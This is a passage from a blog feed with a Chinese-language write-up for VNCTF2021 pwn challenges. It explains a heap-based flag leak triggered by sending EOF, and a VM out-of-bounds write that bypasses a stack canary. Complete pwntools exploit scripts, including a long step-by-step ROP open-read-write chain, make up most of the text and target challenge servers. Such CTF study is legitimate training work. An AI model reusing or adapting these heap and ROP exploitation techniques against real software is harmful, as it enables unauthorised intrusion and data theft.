      <title>VNCTF2021 Writeup</title>
      <link href="archives/328d0a9c/"/>
      <url>archives/328d0a9c/</url>
      
        <content type="html"><![CDATA[<h2 id="White-Give-Flag"><a href="#White-Give-Flag" class="headerlink" title="White_Give_Flag"></a>White_Give_Flag</h2><p>init 函数打开了 <code>/flag</code> ，用 for 循环不断申请堆，将 flag 写入到 fd_nextsize ，然后释放。循环次数和每次申请的 size 都是随机值。</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210321103634.png" alt="image-20210321103629041"></p><p>由于写入到 fd_nextsize 堆块释放时，写入的 flag 没有被覆盖掉，只是在哪个 size 的堆不确定，也就是后面要爆破了。</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210321104036.png" alt="image-20210321104030989"></p><p>程序菜单选择与传统题目不同的是，这个选择是用 read 函数的返回值，而不是用 <code>atoi(buf)</code> 。</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210321105258.png" alt="image-20210321105254124"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210321105518.png" alt="image-20210321105514309"></p><p>这就让 puts 输出提示符时存在问题，read 返回值可以为 <code>-1</code> ，而 <code>menu_hin[-1]</code> 对应是 chunk_list 中第四个堆指针地址：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210321105524.png" alt="image-20210321105427349"></p><p>申请 3 个堆填充，然后将存有 flag 的堆申请到第四个。第四个堆大小需要爆破的，在 bin 中看哪个 size 称心就选它。</p><p>再次选择菜单时，给传入一个 EOF 信号，让 read 返回值为 <code>-1</code> 。发送 EOF 方法参考的文章：</p><blockquote><p><a href="https://paper.seebug.org/444/">https://paper.seebug.org/444/</a></p></blockquote><p>在 shell 中可以使用 ctrl+d 表示 EOF ，pwntools 可以用下面的命令发送 EOF ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = remote(xxxx,xx)</span><br><span class="line">s.sock.shutdown(socket.SHUT_RW)</span><br></pre></td></tr></table></figure><p>但是这样我们没法继续输入了，所以我们需要发送一次 payload 就 getflag ，我们只能 getflag 而不能 getshell ，因为服务器已经关闭了接收我们数据的连接。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">choice</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice:&#x27;</span>)</span><br><span class="line">    p.send(<span class="string">&#x27;1&#x27;</span>*choice)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;size:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;index:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content:\n&#x27;</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment">#p = process(&quot;./White_Give_Flag&quot;)</span></span><br><span class="line">    p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">39123</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&#x27;b *$rebase(0x01242)&#x27;)</span></span><br><span class="line">    add(<span class="number">0x10</span>)</span><br><span class="line">    add(<span class="number">0x10</span>)</span><br><span class="line">    add(<span class="number">0x10</span>)</span><br><span class="line">    add(<span class="number">0x310</span>)</span><br><span class="line">    edit(<span class="number">3</span>,<span class="string">&#x27;x&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice:&#x27;</span>)</span><br><span class="line">    p.shutdown_raw(<span class="string">&#x27;send&#x27;</span>)</span><br><span class="line">    flag = p.recvline()</span><br><span class="line">    log.info(flag)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    p.close()</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="hh"><a href="#hh" class="headerlink" title="hh"></a>hh</h2><p>VM 题目，粗略逆向一下指令发现问题，选项 12 由于下标越界能造成栈溢出：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210321111954.png" alt="image-20210321111950058"></p><p>v31 使用 buf[v9] 读取可以被我们控制为任意值。</p><p>接下载就是逆向执行，没有全部逆向出来，贴一下官方 wp 图：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210321112707.png" alt="image-20210321112703863"></p><p>主要是 678 这几个指令没能理解到位。整体分析下来，vm 用 32 位的方式运作</p><ul><li>buf 我们输入的内容存储的地方，相当于 text 段</li><li>V15 相当于 eip 指针</li><li>v32 相当于内存段（栈），处理的局部变量在 v32[1000] 附近</li><li>v16 相当于 esp 指针</li></ul><p>大局思路：程序开了沙盒，存在栈溢出，虽然开了 canary ，但是由于vm 修改栈上数据是根据偏移来写，也就是可以跳过 canary 写入后面栈空间，相当于没有开这个保护。构造 orw 读取出 flag。在程序找到了 <code>pop_rdi_ret</code> ，libc 中找到 <code>pop_rdx_rsi_ret</code> 。</p><h3 id="步骤详解"><a href="#步骤详解" class="headerlink" title="步骤详解"></a>步骤详解</h3><p>写入 ”flag” 到栈上，等下写入地址作为参数传给 orw 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step 0 </span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0x67616c66</span>)   <span class="comment">#push &quot;flag&quot;</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0xd9</span>)        <span class="comment">#store &quot;flag&quot; on 0xd8</span></span><br></pre></td></tr></table></figure><p>接下来在 rip 开始写入 orw ROP 利用链。v32[0x3ef+1000] 就是 rip 的低 8 bit 。先用 9 将 pop_rdi_ret 低 8 bit 压入 v32[1000] ，再用 12 将 v32[1000] 的值存放到 eip ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step 1:write pop_rdi_ret into rip</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(pop_rdi_ret)  <span class="comment">#push pop_rdi_ret</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3ef</span>)       <span class="comment">#store pop_rdi low 8bit</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0</span>)            <span class="comment">#push pop_rdi_ret high 8bit(0)</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f0</span>)       <span class="comment">#store pop_rdi_ret high 8bit(0)</span></span><br></pre></td></tr></table></figure><p>然后就是准备 open 最麻烦的 rdi 参数，也就是 “flag” 的栈地址。先读取 ebp 的值（rbp低8bit) ，通过调试看刚刚 “flag“ 存入偏移 0xd8 对应真实地址和 ebp 的距离，通过 1 或 2 加减偏移得出 ”flag“ 栈地址，然后 12 存入对应位置。由于高 8 bit 都一样，所以直接将 rbp 高 8 bit 复制过去。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step 2:load stack_addr;redirect to &quot;flag&quot;;write &quot;flag&quot;_addr on stack</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3ed</span>)       <span class="comment">#load stack_addr(ebp) low 8bit</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0xc70</span>)        </span><br><span class="line">payload += p32(<span class="number">2</span>)                   <span class="comment">#redirect to right addr</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f1</span>)</span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3ee</span>)       <span class="comment">#load stack_addr(ebp) high 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f2</span>)       <span class="comment">#flag_addr</span></span><br></pre></td></tr></table></figure><p>pop_rdx_rsi_ret 在 libc 中，参看上面找栈地址方式找到 libc 地址，然后修正偏移：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step 3</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3f7</span>)       <span class="comment">#load libc_addr low 8bit</span></span><br><span class="line"><span class="comment"># payload += p32(9)+p32(0x10e972)     #p#0x130569-0x21bf7</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0xf4949</span>)</span><br><span class="line">payload += p32(<span class="number">1</span>)                   <span class="comment">#redirect to right addr</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f3</span>)       <span class="comment">#store pop_rdx_rsi blow 8bit</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3f8</span>)       <span class="comment">#load libc_addr high 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f4</span>)       <span class="comment">#store pop_rdx_rsi high 8bit</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0</span>)            <span class="comment">#push 0</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f5</span>)       <span class="comment">#rdx low 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f6</span>)       <span class="comment">#rdx high 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f7</span>)       <span class="comment">#rsi low 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f8</span>)       <span class="comment">#rsi high 8bit</span></span><br></pre></td></tr></table></figure><p>后面步骤和前面基本一样：传数据就 9 和 12；写 gadget 、函数就先 load、修改偏移、12 存入栈。只是注意加载 libc 低 8 bit 从 main_start 变成 pop_rdx_rsi_ret ，注意一下偏移计算就好。</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.binary = <span class="string">&quot;./hh&quot;</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004011a3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step 0 </span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0x67616c66</span>)   <span class="comment">#push &quot;flag&quot;</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0xd9</span>)        <span class="comment">#store &quot;flag&quot; on 0xd8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step 1:write pop_rdi_ret into rip</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(pop_rdi_ret)  <span class="comment">#push pop_rdi_ret</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3ef</span>)       <span class="comment">#store pop_rdi low 8bit</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0</span>)            <span class="comment">#push pop_rdi_ret high 8bit(0)</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f0</span>)       <span class="comment">#store pop_rdi_ret high 8bit(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step 2:load stack_addr;redirect to &quot;flag&quot;;write &quot;flag&quot;_addr on stack</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3ed</span>)       <span class="comment">#load stack_addr(ebp) low 8bit</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0xc70</span>)        </span><br><span class="line">payload += p32(<span class="number">2</span>)                   <span class="comment">#redirect to right addr</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f1</span>)</span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3ee</span>)       <span class="comment">#load stack_addr(ebp) high 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f2</span>)       <span class="comment">#flag_addr</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step 3</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3f7</span>)       <span class="comment">#load libc_addr low 8bit</span></span><br><span class="line"><span class="comment"># payload += p32(9)+p32(0x10e972)     #p#0x130569-0x21bf7</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0xf4949</span>)</span><br><span class="line">payload += p32(<span class="number">1</span>)                   <span class="comment">#redirect to right addr</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f3</span>)       <span class="comment">#store pop_rdx_rsi blow 8bit</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3f8</span>)       <span class="comment">#load libc_addr high 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f4</span>)       <span class="comment">#store pop_rdx_rsi high 8bit</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0</span>)            <span class="comment">#push 0</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f5</span>)       <span class="comment">#rdx low 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f6</span>)       <span class="comment">#rdx high 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f7</span>)       <span class="comment">#rsi low 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f8</span>)       <span class="comment">#rsi high 8bit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step 4</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3f3</span>)</span><br><span class="line"><span class="comment"># payload += p32(9)+p32(0x20859)      #0x130569-0x10fd10</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0x1e099</span>)</span><br><span class="line">payload += p32(<span class="number">2</span>)</span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3f9</span>)</span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3f4</span>)</span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3fa</span>)       <span class="comment">#open</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step 5</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(pop_rdi_ret)  <span class="comment">#push pop_rdi_ret</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3fb</span>)       <span class="comment">#store pop_rdi low 8bit</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0</span>)            <span class="comment">#push pop_rdi_ret high 8bit(0)</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3fc</span>)       <span class="comment">#store pop_rdi_ret high 8bit(0)</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">3</span>)            <span class="comment">#push 3 low 8bit(rdi)</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3fd</span>)       <span class="comment">#store 3 low 8bit(rdi)</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0</span>)            <span class="comment">#push 3 high 8bit(rdi)</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3fe</span>)       <span class="comment">#store 3 high 8bit(rdi)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step 6</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3f3</span>)       <span class="comment">#load pop_rdx_rsi_libcaddr(step3) low 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x3ff</span>)       <span class="comment">#store pop_rdx_rsi blow 8bit</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3f4</span>)       <span class="comment">#load pop_rdx_rsi_libcaddr(step3) high 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x400</span>)       <span class="comment">#store pop_rdx_rsi high 8bit</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0x30</span>)         <span class="comment">#push 0x30 low 8bit(rdx)</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x401</span>)</span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0</span>)            <span class="comment">#push 0x30 high 8bit(rdx)</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x402</span>)       </span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3ed</span>)       <span class="comment">#load stack_addr(ebp) low 8bit</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0xb70</span>)</span><br><span class="line">payload += p32(<span class="number">2</span>)                   <span class="comment">#redirect to right addr</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x403</span>)       <span class="comment">#store &quot;flag&quot; low 8bit(rsi)</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3ee</span>)       <span class="comment">#load stack_addr(ebp) high 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x404</span>)       <span class="comment">#store &quot;flag&quot; high 8bit(rsi)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step 7</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3f3</span>)       <span class="comment">#load pop_rdx_rsi_libcaddr(step3) low 8bit</span></span><br><span class="line"><span class="comment"># payload += p32(9)+p32(0x20429)      #0x130569-0x110140</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0x1de79</span>)</span><br><span class="line">payload += p32(<span class="number">2</span>)                   <span class="comment">#redirect to right addr</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x405</span>)</span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3f4</span>)       <span class="comment">#load pop_rdx_rsi_libcaddr(step3) high 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x406</span>)       <span class="comment">#read</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step 8 </span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(pop_rdi_ret)      <span class="comment">#push pop_rdi_ret</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x407</span>)       <span class="comment">#store pop_rdi low 8bit</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0</span>)            <span class="comment">#push pop_rdi_ret high 8bit(0)</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x408</span>)       <span class="comment">#store pop_rdi_ret high 8bit(0)</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">1</span>)            <span class="comment">#push 1 high 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x409</span>)</span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0</span>)            <span class="comment">#push 1 low 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x40a</span>)       </span><br><span class="line"></span><br><span class="line"><span class="comment"># step 9</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3f3</span>)       <span class="comment">#load pop_rdx_rsi_libcaddr(step3) low 8bit</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x40b</span>)       <span class="comment">#store pop_rdx_rsi blow 8bit</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3f4</span>)</span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x40c</span>)       <span class="comment">#store pop_rdx_rsi high 8bit</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0x30</span>)         <span class="comment">#push 0x30 low 8bit(rdx)</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x40d</span>)</span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0</span>)            <span class="comment">#push 0x30 high 8bit(rdx)</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x40e</span>) </span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3ed</span>)       <span class="comment">#load stack_addr(ebp) low 8bit</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0xb70</span>)</span><br><span class="line">payload += p32(<span class="number">2</span>)                   <span class="comment">#redirect to right addr</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x40f</span>)       <span class="comment">#store &quot;flag&quot; low 8bit(rsi)</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3ee</span>)</span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x410</span>)       <span class="comment">#store &quot;flag&quot; high 8bit(rsi)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step 10</span></span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3f3</span>)       <span class="comment">#load pop_rdx_rsi_libcaddr(step3) low 8bit</span></span><br><span class="line"><span class="comment"># payload += p32(9)+p32(0x20359)      #0x130569-0x110210</span></span><br><span class="line">payload += p32(<span class="number">9</span>)+p32(<span class="number">0x1de19</span>)</span><br><span class="line">payload += p32(<span class="number">2</span>)                   <span class="comment">#redirect to right addr</span></span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x411</span>)</span><br><span class="line">payload += p32(<span class="number">10</span>)+p32(<span class="number">0x3f4</span>)</span><br><span class="line">payload += p32(<span class="number">12</span>)+p32(<span class="number">0x412</span>)       <span class="comment">#write</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./hh&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25189</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Give me you choice :\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;code:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *0x400B46&quot;)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Give me you choice :\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ff"><a href="#ff" class="headerlink" title="ff"></a>ff</h2><h2 id="官方-WP"><a href="#官方-WP" class="headerlink" title="官方 WP"></a>官方 WP</h2><p><a href="https://mp.weixin.qq.com/s/1OzuKnQK2wNxhHYObN3UYA">https://mp.weixin.qq.com/s/1OzuKnQK2wNxhHYObN3UYA</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> VNCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVRF路由器漏洞靶机题目笔记</title>
      <link href="archives/6f13cd09/"/>
      <url>archives/6f13cd09/</url>
      
